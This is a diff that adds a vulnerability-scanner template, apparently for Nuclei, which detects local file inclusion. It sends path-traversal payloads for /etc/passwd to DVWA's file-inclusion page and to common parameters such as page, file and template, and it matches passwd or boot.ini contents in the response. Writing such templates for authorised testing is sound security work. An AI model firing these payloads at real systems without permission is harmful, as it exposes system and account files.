@@ -1,0 +1,37 @@
+id: hunt3r-lfi-detection
+
+info:
+  name: Local File Inclusion Detection
+  author: hunt3r
+  severity: high
+  description: Detects LFI via path traversal in common parameters. Tests DVWA file inclusion and generic page/file params.
+  tags: lfi,file-inclusion,hunt3r
+  reference:
+    - https://portswigger.net/web-security/file-path-traversal
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/vulnerabilities/fi/?page=../../../../../../etc/passwd"
+      - "{{BaseURL}}/vulnerabilities/fi/?page=....//....//....//etc/passwd"
+      - "{{BaseURL}}/vulnerabilities/fi/?page=..%2F..%2F..%2F..%2Fetc%2Fpasswd"
+      - "{{BaseURL}}/?page=../../../etc/passwd"
+      - "{{BaseURL}}/?file=../../../etc/passwd"
+      - "{{BaseURL}}/?include=../../../etc/passwd"
+      - "{{BaseURL}}/?path=../../../etc/passwd"
+      - "{{BaseURL}}/?template=../../../etc/passwd"
+      - "{{BaseURL}}/?doc=../../../etc/passwd"
+      - "{{BaseURL}}/?lang=../../../etc/passwd"
+      - "{{BaseURL}}/download?file=../../../etc/passwd"
+      - "{{BaseURL}}/file?path=../../../etc/passwd"
+
+    matchers-condition: or
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "root:([x*]|[a-zA-Z0-9!$#%_@&\\.\\-]+):0:0:"
+          - "\\[boot loader\\]"
+          - "\\[operating systems\\]"
+          - "daemon:.*:/bin"
+          - "sbin/nologin"
